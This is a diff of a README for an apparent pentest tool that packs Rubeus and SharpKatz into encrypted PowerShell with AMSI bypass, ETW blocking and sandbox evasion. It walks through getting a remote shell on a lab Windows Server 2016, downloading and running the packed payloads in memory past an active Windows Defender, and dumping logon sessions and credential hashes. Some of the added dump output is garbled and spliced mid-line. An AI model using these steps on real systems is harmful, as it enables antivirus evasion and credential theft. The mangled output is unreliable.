@@ -7,8 +7,8 @@ It generates an obfuscated and encrypted PowerShell script that contains the (C#
 
 => https://github.com/Jean-Francois-C/Windows-Penetration-Testing/tree/master/Defense%20evasion%20(examples)/Invoke-PoSH-CsharpPacker
 
-FEATURES
---------
+Features
+---------
 > AES encryption and GZip/Deflate compression (based on 'Xencrypt')
 > AMSI bypass
 > Blocking Event Tracing for Windows (ETW)
@@ -17,11 +17,16 @@ FEATURES
   + stop/exit if the PowerShell session is being debugged (detection based on "Test-Path Variable:PSDebugContext")
   + wait for 60 seconds before execution
 
+Important note
+--------------
+=> It works well with Windows server 2016 but not with Windows 10.
+
 
 =====================================================================================================================================
-Examples - Run a packed/encrypted version of Rubeus and SharpKatz on a Windows 10 laptop without being detected by Windows Defender
+Examples - Run a packed/encrypted version of Rubeus and SharpKatz on a Windows server 2016 without being detected by Windows Defender
 =====================================================================================================================================
 
+--------------------------------------------------------------------------------------------------------
 Step 1 - Create a packed/encrypted version of Rubeus and SharpKatz using 'Invoke-PoSH-CsharpPacker.ps1'
 --------------------------------------------------------------------------------------------------------
 
@@ -72,28 +77,65 @@ PS C:\Users\Administrator\Documents\Tools-Pentest\1-Antivirus-bypass\PoSH-Packer
 [+] Done!
 
 
+-----------------------------------------------------------------------------------------------------------------------------------------------
 Step 2 - Download & execute into memory the packed/encrypted version of Rubeus and SharpKatz without being detected by the Windows Defender AV
 -----------------------------------------------------------------------------------------------------------------------------------------------
 
-PS C:\Users\Administrator\Desktop> systeminfo
-Host Name:                 Laptop1
-OS Name:                   Microsoft Windows 10 Pro
-OS Version:                10.0.19044 N/A Build 19044
+C:\Users\Administrator\Documents\Tools-Pentest\4-Impacket_windows>wmiexec.exe administrator@192.168.56.106
+Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
+
+Password:
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+
+C:\> cd C:\temp\
+
+C:\temp> systeminfo
+Host Name:                 WEBSERVER2
+OS Name:                   Microsoft Windows Server 2016 Datacenter
+OS Version:                10.0.14393 N/A Build 14393
 OS Manufacturer:           Microsoft Corporation
-OS Configuration:          Member Workstation
+OS Configuration:          Member Server
 OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:
+Product ID:                00377-90016-42795-AA673
+Original Install Date:     29/01/2023, 23:32:13
+System Boot Time:          09/02/2023, 21:24:37
+System Manufacturer:       innotek GmbH
+System Model:              VirtualBox
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: Intel64 Family 6 Model 142 Stepping 10 GenuineIntel ~1896 Mhz
+BIOS Version:              innotek GmbH VirtualBox, 01/12/2006
 <SNIP>
 
-PS C:\Users\Administrator\Desktop> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AntivirusSignatureLastUpdated | FL
+
+C:\> Powershell -c iex "Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AntivirusSignatureLastUpdated | FL
+> C:\temp\AV-status.txt"
+
+
+C:\> type C:\temp\AV-status.txt
 AntivirusEnabled              : True
 RealTimeProtectionEnabled     : True
 IoavProtectionEnabled         : True
 AntispywareEnabled            : True
-AntivirusSignatureLastUpdated : 09/02/2023 05:51:18
+AntivirusSignatureLastUpdated : 02/02/2023 04:49:12
 
 
-PS C:\Users\Administrator\Desktop> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.113:8081/packed-rubeus.ps1');
-PS C:\Users\Administrator\Desktop> Invoke-Packed-NET-Executable logonsession /current
+C:\temp> put Test1.ps1
+[*] Uploading Test1.ps1 to C:\temp\Test1.ps1
+
+
+C:\> type C:\temp\Test1.ps1
+IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.1:8081/temp/packed-rubeus.ps1');
+Invoke-Packed-NET-Executable logonsession /current > C:\temp\Test1.txt
+
+
+C:\temp> Powershell -c iex C:\temp\Test1.ps1
+
+C:\temp> type test1.txt
 
    ______        _
   (_____ \      | |
@@ -104,76 +146,89 @@ PS C:\Users\Administrator\Desktop> Invoke-Packed-NET-Executable logonsession /cu
 
   v2.2.2
 
+
 [*] Action: Display all logon session information
 
-    LUID          : 0x12e3084f (316868687)
+    LUID          : 0x7b09a (503962)
     UserName      : Administrator
-    LogonDomain   : Laptop1
-    SID           : S-1-5-21-936125016-2310263949-2175806047-500
+    LogonDomain   : WEBSERVER2
+    SID           : S-1-5-21-2855040287-2641962212-1900751911-500
     AuthPackage   : NTLM
-    LogonType     : Interactive (2)
-    Session       : 8
-    LogonTime     : 08/02/2023 20:52:52
-    LogonServer   : Laptop1
+    LogonType     : Network (3)
+    Session       : 0
+    LogonTime     : 09/02/2023 21:31:40
+    LogonServer   : WEBSERVER2
     DnsDomainName :
     Upn           :
 
-    LUID          : 0x12dc17b2 (316413874)
-    UserName      : DWM-8
-    LogonDomain   : Window Manager
-    SID           : S-1-5-90-0-8
-    AuthPackage   : Negotiate
-    LogonType     : Interactive (2)
-    Session       : 8
-    LogonTime     : 08/02/2023 19:42:01
-    LogonServer   :
+    LUID          : 0x69578 (431480)
+    UserName      : Administrator
+    LogonDomain   : WEBSERVER2
+    SID           : S-1-5-21-2855040287-2641962212-1900751911-500
+    AuthPackage   : NTLM
+    LogonType     : Network (3)
+    Session       : 0
+    LogonTime     : 09/02/2023 21:27:40
+    LogonServer   : WEBSERVER2
     DnsDomainName :
     Upn           :
-	
 <SNIP>
 
 
-PS C:\Users\Administrator\Desktop> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.113:8081/packed-katz.ps1');
-PS C:\Users\Administrator\Desktop> Invoke-Packed-NET-Executable --Commands logonpasswords
+C:\temp> put Test2.ps1
+[*] Uploading Test2.ps1 to C:\temp\Test2.ps1
+
+
+C:\temp> type C:\temp\Test2.ps1
+IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.1:8081/temp/packed-katz.ps1');
+Invoke-Packed-NET-Executable --Commands logonpasswords > C:\temp\Test2.txt
+
+
+C:\temp> Powershell -c iex C:\temp\Test2.ps1
+
+C:\temp> type test2.txt
 [*]
 [*]                     System Information
 [*] ----------------------------------------------------------------------
 [*] | Platform: Win32NT                                                  |
 [*] ----------------------------------------------------------------------
-[*] | Major: 10            | Minor: 0             | Build: 19044         |
+[*] | Major: 10            | Minor: 0             | Build: 14393         |
 [*] ----------------------------------------------------------------------
-[*] | Version: Microsoft Windows NT 10.0.19044.0                         |
+[*] | Version: Microsoft Windows NT 10.0.14393.0                         |
 [*] ----------------------------------------------------------------------
 [*]
-[*] Authentication Id   : 0;316868687 (00000000:316868687)
-[*] Session             : Interactive from 8
-[*] UserName            : Administrator
-[*] LogonDomain         : Laptop1
-[*] LogonServer         : Laptop1
-[*] LogonTime           : 2023/02/08 20:52:52
-[*] SID                 : S-1-5-21-936125016-2310263949-2175806047-500
-[*]
-[*]      Msv
-[*]       Domain   : Laptop1
-[*]       Username : Administrator
-[*]       LM       : 00000000000000000000000000000000
-[*]       NTLM     : 36f7a3ebaa54935ecf03678e118<SNIP>
-[*]       SHA1     : d5feabcececab0e16c2cbb39178<SNIP>
-[*]       DPAPI    : 00000000000000000000000000000000
-[*]
-[*]      Tspkg
-[*]       Domain   : Laptop1
-[*]       Username : Administrator
-[*]       Password : <SNIP>
-[*]
-[*]      WDigest
-[*]       Hostname : Laptop1
-[*]       Username : Administrator
-[*]       Password : [NULL]
+[*] Authentication Id   : 0;431480 (00000000:00431480)
+[*] Session             : Network from 0
+[*] UserName            : Administrator] LogonTime: 2023/02/09 21:27:40
+[*] SID                 : S-1-5-21-2855040287-2641962212-1900751911-500
 [*]
 [*]      Kerberos
-[*]       Domain   : Laptop1
-[*]       Username : Administrator
-[*]       Password : [NULL]
-
+[*]       Domain   : WEBSERVER28786)
+[*] Session             : Interactive from 1
+[*] UserName            : DWM-1ger-5-90-0-1
+[*]
+[*]      Msv
+[*]       Domain   : COMPANY
+[*]       Username : WEBSERVER2$
+[*]       LM       : 00000000000000000000000000000000
+[*]       NTLM     : b71e7e77879711011bc5c3<SNIP>
+[*]       SHA1     : 3e142f00c4a695910fed0b<SNIP>
+[*]       DPAPI    : 00000000000000000000000000000000
+[*]
+[*]      WDigest
+[*]       Hostname : COMPANYame : WEBSERVER2$ : company.workVcZrm/Uc&+*ujA?lCgl,DfzQ7c?FZh<SNIP>
+[*]
+[*] Authentication Id   : 0;58011 (00000000:00058011)
+[*] Session             : Interactive from 1
+[*] UserName            : DWM-1ager1-5-90-0-1
+[*]
+[*]      Msv
+[*]       Domain   : COMPANY
+[*]       Username : WEBSERVER2$
+[*]       LM       : 00000000000000000000000000000000
+[*]       NTLM     : b71e7e77879711011bc5c39b<SNIP>
+[*]       SHA1     : 3e142f00c4a695910fed0bac<SNIP>
+[*]       DPAPI    : 00000000000000000000000000000000
+[*]
+[*]      WDigest
 <SNIP>
